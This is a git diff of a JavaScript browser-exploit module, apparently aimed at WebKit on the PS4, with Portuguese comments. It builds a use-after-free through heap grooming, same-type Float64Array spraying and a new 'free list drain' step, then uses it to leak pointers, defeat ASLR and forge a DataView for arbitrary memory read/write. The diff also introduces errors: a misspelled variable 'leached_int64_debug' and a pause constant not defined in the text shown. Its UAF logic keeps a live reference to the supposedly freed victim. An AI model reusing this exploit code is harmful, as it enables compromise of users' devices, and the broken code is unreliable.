@@ -1,11 +1,11 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v04 - Spray UAF de Mesmo Tipo e Correção de Escopo)
+// js/script3/testArrayBufferVictimCrash.mjs (v05 - Spray UAF de Mesmo Tipo e Drenagem de Free List)
 // =======================================================================================
 // ESTA VERSÃO INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
 // 1. Validar primitivas básicas (OOB local).
 // 2. Acionar Use-After-Free (UAF) para obter um ponteiro Double taggeado vazado.
 //    - Estratégia de Spray de objetos do MESMO TIPO da vítima (Float64Array para Float64Array).
-//    - Múltiplas tentativas de UAF se o vazamento inicial falhar.
-//    - Correção de erro de escopo de variável.
+//    - Drenagem ativa da free list após a liberação da vítima.
+//    - Múltiplas tentativas de UAF.
 // 3. Desfazer o "tag" do ponteiro vazado e calcular a base ASLR da WebKit.
 // 4. Com a base ASLR, forjar um DataView para obter Leitura/Escrita Arbitrária Universal (ARB R/W).
 // 5. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
@@ -28,7 +28,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "v04 - Spray UAF de Mesmo Tipo e Correção de Escopo";
+export const FNAME_MODULE = "v05 - Spray UAF de Mesmo Tipo e Drenagem de Free List";
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -259,35 +259,32 @@ async function triggerGC(logFn, pauseFn) {
  * @returns {Float64Array} A referência pendurada (dangling reference) que será o alvo da confusão de tipos.
  */
 async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) {
-    let dangling_ref_local = null; // Usar uma variável local para evitar o ReferenceError
+    let dangling_ref_local = null;
     const VICTIM_SIZE_BYTES = 0x80; // Tamanho do objeto vítima para UAF (128 bytes)
     // Este tamanho é um múltiplo de 16 (0x80 / 0x10 = 8), o que pode se alinhar bem aos buckets do bmalloc.
-    const SPRAY_COUNT_UAF_OPT = 2000; // Otimizado para 2000 objetos de spray para PS4
-    const SPRAY_OBJECT_DATA_LENGTH = VICTIM_SIZE_BYTES / 8; // Para Float64Array (16 doubles para 128 bytes)
+    const SPRAY_COUNT_UAF_OPT = 2000; // Número de objetos no spray UAF
+    const SPRAY_OBJECT_DATA_LENGTH = VICTIM_SIZE_BYTES / 8; // Número de doubles para Float64Array (16 doubles para 128 bytes)
 
-    logFn(`[UAF] Iniciando spray e criação de ponteiro pendurado (v04 - spray de mesmo tipo)...`, "info");
+    logFn(`[UAF] Iniciando spray e criação de ponteiro pendurado (v05 - spray de mesmo tipo e drenagem)...`, "info");
 
     // FASE 1: Heap Grooming (Preparação do Heap)
-    // O objetivo é "pré-alocar" e liberar memória para criar um ambiente de heap mais previsível.
-    // Isso tenta "esvaziar" ou "fragmentar" intencionalmente certos buckets do heap.
     const HEAP_GROOMING_SPRAY_COUNT = 15000;
     const grooming_spray_before_victim = [];
     logFn(`[UAF] FASE 1: Heap Grooming com ${HEAP_GROOMING_SPRAY_COUNT} objetos de tamanhos variados para preparar o heap...`, "subtest");
     for (let i = 0; i < HEAP_GROOMING_SPRAY_COUNT; i++) {
         const size_variant = (i % 16) * 0x10 + 0x40; // Ex: 0x40, 0x50, ..., 0x130 (em múltiplos de 16)
-        grooming_spray_before_victim.push(new ArrayBuffer(size_variant)); // Pode ser ArrayBuffer para grooming
+        grooming_spray_before_victim.push(new ArrayBuffer(size_variant));
     }
-    hold_objects.push(grooming_spray_before_victim); // Mantém o grooming spray vivo
+    hold_objects.push(grooming_spray_before_victim);
     await pauseFn(LOCAL_SHORT_PAUSE);
 
-    // PASSO 2: Criar o objeto vítima que será liberado.
-    // O tipo de objeto (Float64Array) é crucial para como o ponteiro será lido.
+    // PASSO 2: Criar o objeto vítima (Float64Array)
     let victim_object_arr = new Float64Array(SPRAY_OBJECT_DATA_LENGTH);
     victim_object_arr[0] = 1.000000000000123;
     victim_object_arr[1] = 2.0;
 
     hold_objects.push(victim_object_arr);
-    dangling_ref_local = victim_object_arr; // Atribui à variável local
+    dangling_ref_local = victim_object_arr;
 
     // Forçar otimizações (acessando a vítima repetidamente)
     for (let i = 0; i < 10000; i++) {
@@ -302,18 +299,42 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
     logFn("--- FASE 2: Forçando Coleta de Lixo para liberar a memória do objeto vítima ---", "subtest");
     const ref_index = hold_objects.indexOf(victim_object_arr);
     if (ref_index > -1) { hold_objects.splice(ref_index, 1); }
-    victim_object_arr = null; // Remova a última referência forte.
+    victim_object_arr = null;
     await triggerGC(logFn, pauseFn);
     logFn("    Memória do objeto-alvo liberada (se o GC atuou).", "info");
     await pauseFn(LOCAL_SHORT_PAUSE);
 
-    // Liberar o grooming spray inicial. Isso cria mais "buracos" no heap.
-    // Não limparemos global_spray_objects aqui, apenas o grooming_spray_before_victim
-    grooming_spray_before_victim.length = 0; // Limpa o array, liberando as referências para GC
+    // Liberar o grooming spray inicial para criar mais "buracos" no heap.
+    grooming_spray_before_victim.length = 0;
     const groom_in_hold_index = hold_objects.indexOf(grooming_spray_before_victim);
     if (groom_in_hold_index > -1) { hold_objects.splice(groom_in_hold_index, 1); }
     await triggerGC(logFn, pauseFn);
     logFn("    Grooming spray inicial liberado e GC forçado novamente.", "info");
+    await pauseFn(LOCAL_SHORT_SHORT_PAUSE); // Pausa menor aqui para o próximo passo.
+
+    // NOVO: Drenagem Ativa da Free List (Hypothesis)
+    // Tenta alocar e liberar pequenos grupos de objetos do mesmo tamanho da vítima.
+    // A ideia é que, se o bmalloc tiver uma "quarentena" ou "cache" para blocos liberados,
+    // essa drenagem forçaria o bloco da vítima a sair dessa quarentena e ser reutilizável,
+    // ou "limpar" os blocos antes do spray principal.
+    const DRAIN_COUNT = 50; // Número de "drenagens"
+    const DRAIN_SPRAY_PER_ITERATION = 50; // Quantos objetos alocar/liberar por drenagem
+    logFn(`[UAF] FASE 2.5: Drenagem Ativa da Free List (${DRAIN_COUNT} iterações, ${DRAIN_SPRAY_PER_ITERATION} objetos/iteração)...`, "subtest");
+    for (let d = 0; d < DRAIN_COUNT; d++) {
+        const drain_objects = [];
+        for (let i = 0; i < DRAIN_SPRAY_PER_ITERATION; i++) {
+            drain_objects.push(new Float64Array(SPRAY_OBJECT_DATA_LENGTH)); // Aloca Float64Array do mesmo tamanho da vítima
+        }
+        // Não adicione drain_objects a hold_objects; eles serão liberados implicitamente ao sair do escopo
+        // ou quando o GC rodar se eles não forem referenciados.
+        // Forçar o GC periodicamente ou confiar na próxima rodada.
+        if (d % 10 === 0) { // Forçar GC a cada 10 iterações para limpar o drain_objects
+             await triggerGC(logFn, pauseFn);
+        }
+        await pauseFn(LOCAL_VERY_SHORT_PAUSE); // Pequena pausa entre cada drenagem
+    }
+    await triggerGC(logFn, pauseFn); // Garante que todos os objetos de drenagem sejam coletados
+    logFn("    Drenagem ativa da Free List concluída.", "info");
     await pauseFn(LOCAL_SHORT_PAUSE);
 
 
@@ -326,7 +347,7 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
 
     let TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = TEMPORARY_ESTIMATED_WEBKIT_BASE.add(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);
 
-    const OBJECT_PTR_TAG_HIGH_EXPECTED = 0x402a0000; // Tag comum para ponteiros de objetos em doubles.
+    const OBJECT_PTR_TAG_HIGH_EXPECTED = 0x402a0000;
     const tagged_high_for_spray = TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.high() | OBJECT_PTR_TAG_HIGH_EXPECTED;
     TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = new AdvancedInt64(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.low(), tagged_high_for_spray);
 
@@ -335,21 +356,20 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
     logFn(`[UAF] Valor Double do VTable da Structure para pulverização (assumindo tag ${toHex(OBJECT_PTR_TAG_HIGH_EXPECTED)} e base): ${toHex(_doubleToInt64_direct(spray_value_double_to_leak_ptr), 64)}`, "info");
 
     for (let i = 0; i < SPRAY_COUNT_UAF_OPT; i++) {
-        // MUITO IMPORTANTE: Usar Float64Array diretamente para o spray.
+        // ESSENCIAL: Usar Float64Array diretamente para o spray.
         // Isso aumenta a probabilidade de reocupar o mesmo "bucket" de memória que o Float64Array vítima.
-        const spray_obj = new Float64Array(SPRAY_OBJECT_DATA_LENGTH); // Mesmo tamanho do vítima
-        spray_obj[0] = spray_value_double_to_leak_ptr; // Escreve o ponteiro da Structure no início do buffer
-        // Preenche o resto com marcadores
+        const spray_obj = new Float64Array(SPRAY_OBJECT_DATA_LENGTH);
+        spray_obj[0] = spray_value_double_to_leak_ptr;
         for (let j = 1; j < spray_obj.length; j++) {
-            spray_obj[j] = _int64ToDouble_direct(new AdvancedInt64(0xAA + j, 0xBB + j)); // Padrão variado
+            spray_obj[j] = _int64ToDouble_direct(new AdvancedInt64(0xAA + j, 0xBB + j));
         }
         spray_arrays.push(spray_obj);
     }
-    hold_objects.push(spray_arrays); // Mantém os arrays em spray vivos.
+    hold_objects.push(spray_arrays);
     logFn(`    Pulverização de ${spray_arrays.length} Float64Array concluída sobre a memória da vítima.`, "info");
-    await pauseFn(LOCAL_SHORT_PAUSE); // Pausa após o spray para permitir estabilização
+    await pauseFn(LOCAL_SHORT_PAUSE);
 
-    return dangling_ref_local; // Retorna a referência pendurada que agora está "confusa"
+    return dangling_ref_local;
 }
 
 
@@ -414,18 +434,17 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
         let uaf_leak_success = false;
         let leaked_jsvalue_from_uaf_double = 0;
-        let current_dangling_ref = null; // Usar uma variável para a referência pendurada desta tentativa
+        let current_dangling_ref = null;
 
         for (let attempt = 1; attempt <= UAF_ATTEMPTS; attempt++) {
             logFn(`[UAF LEAK] Tentativa ${attempt}/${UAF_ATTEMPTS} para vazamento de ASLR via UAF/TC.`, "subtest");
 
             // Limpar os objetos hold_objects (que incluem a vítima e o spray do UAF da tentativa anterior)
-            hold_objects = []; // Limpa todo o array hold_objects
-            await triggerGC(logFn, pauseFn); // Forçar GC após a limpeza
+            hold_objects = [];
+            await triggerGC(logFn, pauseFn);
             logFn(`    hold_objects limpos antes da Tentativa UAF #${attempt}.`, "info");
             await pauseFn(LOCAL_SHORT_PAUSE);
 
-            // current_dangling_ref receberá a referência pendurada da nova tentativa
             current_dangling_ref = await sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM);
 
             if (!(current_dangling_ref instanceof Float64Array) || current_dangling_ref.length === 0) {
@@ -436,7 +455,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                  continue;
             }
 
-            // Tentar ler múltiplas vezes para garantir que o valor seja estável
             let read_attempts = 10;
             for(let i = 0; i < read_attempts; i++) {
                 leaked_jsvalue_from_uaf_double = current_dangling_ref[0];
@@ -450,7 +468,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                      uaf_leak_success = true;
                      break;
                 }
-                logFn(`[UAF LEAK] Valor lido inesperado em dangling_ref[0]: ${toHex(leaked_int64_debug, 64)}. Não é um ponteiro taggeado esperado. (Tentativa ${i+1}/${read_attempts})`, "warn");
+                logFn(`[UAF LEAK] Valor lido inesperado em dangling_ref[0]: ${toHex(leached_int64_debug, 64)}. Não é um ponteiro taggeado esperado. (Tentativa ${i+1}/${read_attempts})`, "warn");
                 await pauseFn(LOCAL_VERY_SHORT_PAUSE);
             }
 
